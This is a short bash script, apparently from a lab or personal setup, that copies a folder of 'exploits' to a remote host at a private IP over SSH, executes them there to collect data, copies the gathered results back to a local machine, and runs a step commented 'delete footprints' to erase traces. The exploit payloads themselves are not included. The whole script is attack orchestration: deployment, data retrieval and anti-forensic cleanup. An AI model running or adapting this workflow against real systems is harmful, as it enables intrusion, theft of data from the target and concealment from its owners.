#!/bin/bash

echo coppying exploits...
scp -P 2222 -r temp qaz@192.168.146.136:/tmp/.
echo collecting data...
ssh -t qaz@192.168.146.136 -p 2222 /tmp/temp/new.sh #executeexploits
scp -P 2222 -r qaz@192.168.146.136:/tmp/temp/r /root/Desktop/recived #copybackdata
ssh -t qaz@192.168.146.136 -p 2222 /tmp/temp/exploit <rm.sh #delete footprints


